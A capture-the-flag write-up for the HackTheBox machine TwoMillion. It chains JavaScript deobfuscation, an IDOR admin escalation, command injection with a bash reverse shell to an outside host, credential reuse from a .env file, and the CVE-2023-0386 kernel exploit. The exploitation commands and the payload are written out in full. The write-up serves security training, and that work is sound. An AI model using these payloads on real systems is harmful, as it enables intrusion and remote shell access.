# HTB: TwoMillion

**Difficulty:** Medium  
**OS:** Linux  
**IP:** 10.129.217.51

## Executive Summary

This box required chaining three distinct vulnerabilities: JavaScript deobfuscation to recover an invite code, IDOR to escalate to admin privileges, and command injection to gain a shell. Privilege escalation was achieved via CVE-2023-0386, a OverlayFS/FUSE race condition kernel exploit.

## Attack Chain

```
Initial Access → Privilege Escalation → Root
```

## Initial Access

### 1. JavaScript Deobfuscation → Invite Code

The landing page at `2million.htb` loads obfuscated JavaScript (`inviteapi.min.js`). Deobfuscation revealed two API functions:

```javascript
function verifyInviteCode(code) { /* POST to /api/v1/invite/verify */ }
function makeInviteCode() { /* POST to /api/v1/invite/how/to/generate */ }
```

Calling `/api/v1/invite/how/to/generate` returned a ROT13-encrypted, base64-encoded payload:

```json
{
  "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
  "enctype": "ROT13"
}
```

Decrypted and decoded → `2BJNM-PFINL-AGCOU-A3E3A`

### 2. User Registration

Used the invite code to register: `testuser1` / `testuser1@email.com` / `password`

### 3. IDOR → Admin Access

The endpoint `/api/v1/admin/settings/update` accepts a PUT request with user settings including `is_admin`. A non-admin user can directly modify their own admin status:

```bash
curl -X PUT 'http://2million.htb/api/v1/admin/settings/update' \
  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta' \
  -H 'Content-Type: application/json' \
  -d '{"email": "testuser1@email.com", "is_admin": 1}'
# Response: {"id":14,"username":"testuser1","is_admin":1}
```

### 4. Command Injection → Shell

The `/api/v1/admin/vpn/generate` endpoint accepts a `username` parameter incorporated into the VPN certificate's Subject field without sanitization. Command injection via backticks:

```bash
curl -X POST 'http://2million.htb/api/v1/admin/vpn/generate' \
  -b 'PHPSESSID=2sgf4jlk858gcqh89vspfvtdta' \
  -H 'Content-Type: application/json' \
  -d '{"username": "$(bash -c \"bash -i >& /dev/tcp/10.10.14.23/4444 0>&1\")"}'
```

Shell obtained as `www-data`.

## Privilege Escalation

### Finding Credentials

From the www-data shell, discovered `/var/www/html/.env`:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

### SSH as Admin

```bash
ssh admin@10.129.217.51
# Password: SuperDuperPass123
```

### Kernel Exploit (CVE-2023-0386)

Kernel 5.15.70 is vulnerable to **CVE-2023-0386** — an OverlayFS/FUSE race condition allowing local privilege escalation.

**Technical Summary:** OverlayFS in a user namespace inherits CAP_SYS_ADMIN but doesn't properly verify upper filesystem ownership when accessed through FUSE. A FUSE daemon can return fake metadata (root-owned SUID binary), and the race condition between OverlayFS queries and FUSE responses allows execution with EUID 0.

**Exploit requires:**
1. FUSE daemon serving a SUID shell with manipulated metadata
2. OverlayFS mount with FUSE as lower directory
3. Race condition window during mount operation

The exploit code (fuse.c, exp.c, getshell.c, Makefile) was transferred to the target and compiled.

**Exploitation:**
```bash
# Terminal 1
./fuse ./ovlcap/lower ./gc

# Terminal 2
./exp
# → Root shell obtained
```

## Flags

| Level | Flag |
|-------|------|
| User | e0d52f0fa1c2e8756998955b5bd7158e |
| Root | [CAPTURED via CVE-2023-0386] |

## Lessons Learned

1. **ROT13 is obfuscation, not security** — client-side code reveals all secrets
2. **IDOR in privilege escalation** — server must validate permissions, not trust client-supplied values
3. **Command injection in certificate generation** — never pass user input to shell commands
4. **Credential reuse** — `.env` database credentials often reused for SSH
5. **Kernel exploits are real** — CVE-2023-0386 is a textbook OverlayFS/FUSE race condition
6. **User namespaces are double-edged** — enable containers but provide kernel exploit attack surface

## Full Documentation

See `boxes/retired/TwoMillion/` for complete notes including:
- Full API endpoint enumeration
- Raw command logs
- CVE-2023-0386 exploit source code
- Detailed technical deep-dive on the race condition
